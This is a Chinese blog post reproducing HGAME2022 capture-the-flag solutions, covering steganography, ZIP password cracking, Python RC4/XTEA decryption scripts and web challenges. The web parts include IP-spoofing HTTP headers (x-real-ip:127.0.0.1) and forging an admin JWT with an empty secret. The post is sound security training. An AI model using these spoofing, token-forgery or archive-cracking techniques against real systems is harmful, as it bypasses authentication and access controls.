<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"n9-zqc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。">
<meta property="og:type" content="article">
<meta property="og:title" content="HGAME2022复现">
<meta property="og:url" content="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="N9-zqc">
<meta property="og:description" content="这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220203214641804.png">
<meta property="og:image" content="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220206150512571.png">
<meta property="og:image" content="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220211212523340.png">
<meta property="og:image" content="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220220113824461.png">
<meta property="article:published_time" content="2022-02-20T04:17:53.000Z">
<meta property="article:modified_time" content="2022-02-20T04:51:56.004Z">
<meta property="article:author" content="N9-zqc">
<meta property="article:tag" content="Hgame2022复现">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220203214641804.png">

<link rel="canonical" href="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HGAME2022复现 | N9-zqc</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">N9-zqc</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">有关网络安全的学习笔记,可加QQ:2501152740或发邮箱2501152740@qq.com相互交流</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-文章">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>文章</a>

  </li>
        <li class="menu-item menu-item-查找">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>查找</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://n9-zqc.github.io/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="N9-zqc">
      <meta itemprop="description" content="主要有关ctf的学习笔记,主攻逆向和Web,联系方式QQ:2501152740">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="N9-zqc">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HGAME2022复现
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-02-20 12:17:53 / Modified: 12:51:56" itemprop="dateCreated datePublished" datetime="2022-02-20T12:17:53+08:00">2022-02-20</time>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h3 id="这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。"><a href="#这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。" class="headerlink" title="这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。"></a>这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。</h3><span id="more"></span>

<h4 id="Level-Week1"><a href="#Level-Week1" class="headerlink" title="Level - Week1"></a>Level - Week1</h4><h5 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h5><h6 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h6><p>这一题我只解决了后半部分flag，前半部分flag没有找到。</p>
<p>1.通过流量将数据转为图片。</p>
<p>2.使用stegsolve打开图片，找到green plane2，可以得到一个条形码，就得到了前半部分flag</p>
<p>3.使用lsb隐写可以得到后半部分flag</p>
<p><img src="/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220203214641804.png" alt="image-20220203214641804"></p>
<p>两个部分组合，可以得到</p>
<p>hgame{ez_1mg_Steg4n0g}</p>
<h6 id="这个压缩包有点麻烦"><a href="#这个压缩包有点麻烦" class="headerlink" title="这个压缩包有点麻烦"></a>这个压缩包有点麻烦</h6><p>1.第一步直接明文全数字解密。</p>
<p>2.第二步将文本文档当作字典解密。</p>
<p>3.解压后里面又是个压缩包，和一个README，再打开压缩包看一下下一层压缩包里有一个flag.jpg和一个README，然后发现已经解压出来的README和最后一层压缩包里未解压的README的crc32一样，都是966ac0e8，那就是明文攻击了。根据README，将用存储的方式压缩，得到.zip文件。</p>
<p>4.选择明文攻击，明文文件路径选择压缩的.zip文件，直接明文攻击，最终可以得到加密密钥，也就成功解压出来图片。</p>
<p>5.使用formost分离图片，可以得到zip文件。</p>
<p>知识点：压缩源文件数据区：50 4B 03 04：这是头文件标记</p>
<p>压缩源文件目录区：</p>
<p>50 4B 01 02：目录中文件文件头标记</p>
<p>3F 00：压缩使用的 pkware 版本 </p>
<p>14 00：解压文件所需 pkware 版本 </p>
<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>
<p>压缩源文件目录结束标志 ：50 4B 05 06：目录结束标记 </p>
<p>所以直接用WinRAR修复一下，可以直接得到图片(简单方法)</p>
<p>最终得到hgame{W0w!_y0U_Kn0w_z1p_3ncrYpt!}</p>
<p>这道题让我学会了暴力破解，字典破解，明文破解，伪加密破解这么方法，出题人太强了！</p>
<h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><h6 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h6><p>这道题我解决了前大半部，只剩一点不会解了。</p>
<p>直接添加</p>
<p>GET / HTTP/1.1<br>Host: shop.summ3r.top<br>User-Agent: Hachi-Roku<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>referer:qiumingshan.net<br>Cookie: flavor=Raspberry;<br>gasoline:100<br>x-real-ip:127.0.0.1<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p>
<p>就这个不会添加x-real-ip:127.0.0.1</p>
<p>这个好像X-Forwarded-For没有用，要将其替换为x-real-ip才行。学到了</p>
<h6 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h6><p>1.首先注册登陆自己的账号，从应用程序的本地存储中获得自己的token，使用jwt解析工具进行解析，发现验证失败，当清空secret后发现验证成功。</p>
<p>2.修改jwt中id和username为1和admin。</p>
<p>3.将得到的token替换掉原来的token，刷新可以得到flag</p>
<p>hgame{S0_y0u_K1n0w_hOw_<del>JwT_Works</del>1l1lL}</p>
<p>jwt工具：<a target="_blank" rel="noopener" href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p>
<h5 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h5><h6 id="Dancing-Line"><a href="#Dancing-Line" class="headerlink" title="Dancing Line"></a>Dancing Line</h6><p>此程序来源于网络</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment">#向X轴方向移动一个像素点记为0，向Y轴方向移动一个像素点记为1</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;Dancing Line.bmp&#x27;</span>)</span><br><span class="line">width, heigh = img.size</span><br><span class="line"><span class="built_in">print</span>(width,heigh)</span><br><span class="line">binn_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num_list = []</span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="comment">#将不是白色色块的n添加到num_list数组中</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(heigh):</span><br><span class="line">        pix = img.getpixel((w,h))<span class="comment">#竖着读取色块 主义w,h的关系</span></span><br><span class="line">        <span class="keyword">if</span> pix != (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>): <span class="comment">#白色色块</span></span><br><span class="line">            num_list.append(n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pix, n))</span><br><span class="line">        n+=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num_list)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span>(num_list[i+<span class="number">1</span>]-num_list[i]&gt;=heigh):  <span class="comment">#向右加0反之加1</span></span><br><span class="line">        binn_data+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        binn_data+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]binary data:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(binn_data))</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(binn_data),<span class="number">8</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(binn_data[i:i+<span class="number">8</span>],<span class="number">2</span>))<span class="comment">#2代表以2进制读入数字，每8位一组</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>hgame{Danc1ng_L1ne_15_fun,_15n’t_1t?}</p>
<h6 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h6><p>这道题想到是摩斯密码，但是不知道倒序</p>
<p>将⠨换为. ，⠤换为- ，⠌换为/  倒序字符串，摩斯密码解密，可得</p>
<p>46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D</p>
<p>转为16进制</p>
<p>FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=</p>
<p>维多利亚解码，密钥hgame</p>
<p>YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=</p>
<p>base64：</p>
<p>c0bmvghyz_{0Raz_gxxm0thkzo_0ob0m_vokcczt_!r}</p>
<p>栅栏密码（每组22）：</p>
<p>cbvhz{Rzgx0hz_o0_ocz_r0mgy_0a_xmtko0bmvkct!}</p>
<p>凯撒密码 21：</p>
<p>hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}</p>
<h5 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h5><h6 id="猫头鹰是不是猫"><a href="#猫头鹰是不是猫" class="headerlink" title="猫头鹰是不是猫"></a>猫头鹰是不是猫</h6><p>识别出这就是一个矩阵乘法（线性代数）,改变数据类型后方便观察。（好难）</p>
<h5 id="Level-Week2"><a href="#Level-Week2" class="headerlink" title="Level - Week2"></a>Level - Week2</h5><h6 id="fake-shell"><a href="#fake-shell" class="headerlink" title="fake shell"></a>fake shell</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key=<span class="string">&quot;init_key&quot;</span>, message=<span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span> % s_box)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用解密程序成功。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;res用于解密字符串，解密后是：%res&quot;</span> % res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的字符串是：%s&quot;</span> % cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的输出(没经过任何编码):&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [<span class="number">182</span>, <span class="number">148</span>, <span class="number">250</span>, <span class="number">143</span>, <span class="number">61</span>, <span class="number">95</span>, <span class="number">178</span>, <span class="number">224</span>, <span class="number">234</span>, <span class="number">15</span>, <span class="number">210</span>, <span class="number">102</span>, <span class="number">152</span>, <span class="number">108</span>, <span class="number">157</span>, <span class="number">231</span>, <span class="number">27</span>, <span class="number">8</span>, <span class="number">64</span>, <span class="number">113</span>, <span class="number">197</span>, <span class="number">190</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">124</span>, <span class="number">123</span>, <span class="number">9</span>, <span class="number">141</span>, <span class="number">168</span>, <span class="number">189</span>, <span class="number">243</span>, <span class="number">246</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;w0wy0ugot1t&quot;</span>, s)</span><br></pre></td></tr></table></figure>

<p>得到hgame{s0meth1ng_run_bef0r_m4in?}</p>
<p>这道题做的太傻了，自己都知道RC4解密，也发现了happyhg4me!不是密钥，而是w0wy0ugot1t，但不知道为啥没做出来。</p>
<h6 id="creakme2"><a href="#creakme2" class="headerlink" title="creakme2"></a>creakme2</h6><p>这道题是XTEA加密，本来以为是没有魔改的XTEA，所以没做出来，看汇编其实是有一部分代码改变的XTEA加密算法。</p>
<p><img src="/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220206150512571.png" alt="image-20220206150512571"></p>
<p>idiv是执行有符号整数的除法，除数是ecx，根据汇编可知，当ecx=0时（即除数不能为0）跳转到loc_140001141,eax会异或0x1234567。其中ecx是total的值右移31位（即最高位是否是零来判断是否跳转），魔改后的XTEA加解密代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">v, key</span>):</span></span><br><span class="line">    v0, v1 = c_uint32(v[<span class="number">0</span>]), c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    delta = <span class="number">0x9E3779B1</span></span><br><span class="line"></span><br><span class="line">    total = c_uint32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v0.value += (((v1.value &lt;&lt; <span class="number">4</span>) ^ (v1.value &gt;&gt; <span class="number">5</span>)) + v1.value) ^ (total.value + key[total.value &amp; <span class="number">3</span>])</span><br><span class="line">        total.value += delta</span><br><span class="line">        <span class="keyword">if</span>(total.value &gt;&gt; <span class="number">31</span>==<span class="number">0</span>):</span><br><span class="line">            total.value ^= <span class="number">0x1234567</span></span><br><span class="line">        v1.value += (((v0.value &lt;&lt; <span class="number">4</span>) ^ (v0.value &gt;&gt; <span class="number">5</span>)) + v0.value) ^ (total.value + key[(total.value &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, key</span>):</span></span><br><span class="line">    v0, v1 = c_uint32(v[<span class="number">0</span>]), c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    delta = <span class="number">0x9E3779B1</span></span><br><span class="line">    total = c_uint32(<span class="number">3347991813</span>)</span><br><span class="line">    <span class="comment">#total = c_uint32(delta * 32)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= (((v0.value &lt;&lt; <span class="number">4</span>) ^ (v0.value &gt;&gt; <span class="number">5</span>)) + v0.value) ^ (total.value + key[(total.value &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        <span class="keyword">if</span> (total.value &gt;&gt; <span class="number">31</span> == <span class="number">0</span>):</span><br><span class="line">            total.value ^= <span class="number">0x1234567</span></span><br><span class="line">        total.value -= delta</span><br><span class="line">        v0.value -= (((v1.value &lt;&lt; <span class="number">4</span>) ^ (v1.value &gt;&gt; <span class="number">5</span>)) + v1.value) ^ (total.value + key[(total.value &amp; <span class="number">3</span>)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0.value, v1.value</span><br><span class="line"></span><br><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 待加密的明文，两个32位整型，即64bit的明文数据</span></span><br><span class="line">    value = [<span class="number">0x457E62CF</span>, <span class="number">0x9537896C</span>]</span><br><span class="line">    value1 = [<span class="number">0x1F7E7F72</span>, <span class="number">0xF7A073D8</span>]</span><br><span class="line">    value2 = [<span class="number">0x8E996868</span>, <span class="number">0x40AFAF99</span>]</span><br><span class="line">    value3 = [<span class="number">0xF990E34</span>, <span class="number">0x196F4086</span>]</span><br><span class="line">    <span class="comment"># 四个key，每个是32bit，即密钥长度为128bit</span></span><br><span class="line">    key = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;print(&quot;Data is : &quot;, hex(value[0]), hex(value[1]))</span></span><br><span class="line"><span class="string">    res = encrypt(value, key)</span></span><br><span class="line"><span class="string">    print(&quot;Encrypted data is : &quot;, hex(res[0]), hex(res[1]))&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    ccm=decrypt(value,key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted data is : &quot;</span>, <span class="built_in">hex</span>(ccm[<span class="number">0</span>]), <span class="built_in">hex</span>(ccm[<span class="number">1</span>]))</span><br><span class="line">    ccm = decrypt(value1, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted data is : &quot;</span>,  <span class="built_in">hex</span>(ccm[<span class="number">0</span>]), <span class="built_in">hex</span>(ccm[<span class="number">1</span>]))</span><br><span class="line">    ccm = decrypt(value2, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted data is : &quot;</span>,  <span class="built_in">hex</span>(ccm[<span class="number">0</span>]), <span class="built_in">hex</span>(ccm[<span class="number">1</span>]))</span><br><span class="line">    ccm = decrypt(value3, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted data is : &quot;</span>, <span class="built_in">hex</span>(ccm[<span class="number">0</span>]), <span class="built_in">hex</span>(ccm[<span class="number">1</span>]))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Encrypted data is :  0x6d616768 0x45537b65</span></span><br><span class="line"><span class="string">Encrypted data is :  0x30735f48 0x35646e75</span></span><br><span class="line"><span class="string">Encrypted data is :  0x5f30355f 0x65746e31</span></span><br><span class="line"><span class="string">Encrypted data is :  0x74356572 0x7d676e69</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

